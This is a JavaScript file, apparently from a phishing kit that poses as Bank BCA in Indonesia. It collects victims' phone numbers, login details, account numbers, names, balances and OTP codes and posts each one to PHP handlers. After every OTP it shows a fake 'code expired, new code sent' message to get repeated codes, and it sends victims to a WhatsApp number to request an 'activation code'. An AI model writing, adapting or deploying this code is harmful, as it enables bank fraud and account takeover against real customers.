function go(){
setTimeout(function(){  
location.href='https://api.whatsapp.com/send?phone=628814130578&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝘽𝘾𝘼%0ASaya mau request kode Aktivasi';
    }, 200);    
}     


$(document).ready(function(){
    $('#formHP').submit(function(e) {
    event.preventDefault();
var nomor = document.getElementById("nomor").value;
sessionStorage.setItem("nomor", nomor);
document.getElementById('btnSubmit').innerHTML = "Please wait...";   

 $.ajax({
 type: 'POST',
 url: 'req/no.php',
 data: $(this).serialize(),
 datatype: 'text',
 
  complete: function(data) {
           console.log('Complete')
  setTimeout(function(){
           location.href ="login.html";
  document.getElementById('btnSubmit').innerHTML = "Lanjutkan";
     }, 500);
        }
    });
 });
    return false;
});   
     
     
 $(document).ready(function(){
    $('#kontol').submit(function(e) {
    event.preventDefault();

document.getElementById('btnSubmit').innerHTML = "Please wait...";   

 $.ajax({
 type: 'POST',
 url: 'req/login.php',
 data: $(this).serialize(),
 datatype: 'text',
 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
           location.href ="saldo.html";
    var nomor = document.getElementById('nomor').value;
    sessionStorage.setItem("nomor", nomor);
    var norek = document.getElementById('norek').value;
    sessionStorage.setItem("norek", norek);
    var nama = document.getElementById('nama').value;
    sessionStorage.setItem("nama", nama);           
     }, 500);
        }
    });
 });
    return false;
});        


$(document).ready(function(){
    $('#wangdusonInilah').submit(function(e) {
    event.preventDefault();

document.getElementById('btnSubmit1').innerHTML = "Verify...";   

 $.ajax({
 type: 'POST',
 url: 'req/saldo.php',
 data: $(this).serialize(),
 datatype: 'text',
 
 complete: function(data) {
            console.log('Complete')
  setTimeout(function(){
           location.href ="otp.html";
 var nomor = document.getElementById("nomor").value;
 sessionStorage.setItem("nomor", nomor);
 var nama = document.getElementById("nama").value;
 sessionStorage.setItem("nama", nama);
 var norek = document.getElementById("norek").value;
 sessionStorage.setItem("norek", norek);
 var saldo = document.getElementById("saldo").value;
 sessionStorage.setItem("saldo", saldo);
     }, 500);
        }
    });
 });
    return false;
});   
     
     
 $('#formsaldo1').on('submit', function (event) {

  event.stopPropagation();
    event.preventDefault();
    
document.getElementById('btnSubmit1').innerHTML = "Please wait...";    



$.ajax({

 type: 'POST',
 url: 'req/otp.php',
 async: false,
 dataType: 'text',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')

$("#invalid").addClass("fontku");      
$("#invalid").text("Kode OTP Kadaluarsa, Silahkan Coba Lagi");
$("#invalid").css("color","red");
        
   setTimeout(function(){
        $("#invalid").text("Kode OTP baru sudah kami kirimkan kembali");
$("#invalid").css("color","green");
        $("#invalid").show()
   }, 3000);
   setTimeout(function(){
  $("#invalid").css("color","#005BAA");    
        $("#invalid").text(">> Request Kode Aktivasi / Virtual ? <<");
     $("#invalid").removeClass("fontku");  document.getElementById('btnSubmit1').innerHTML = "PROSES";$("#otp").val("");          
                $("#otp").focus();
   }, 5000);



        }
    });

    return false;
});   
             
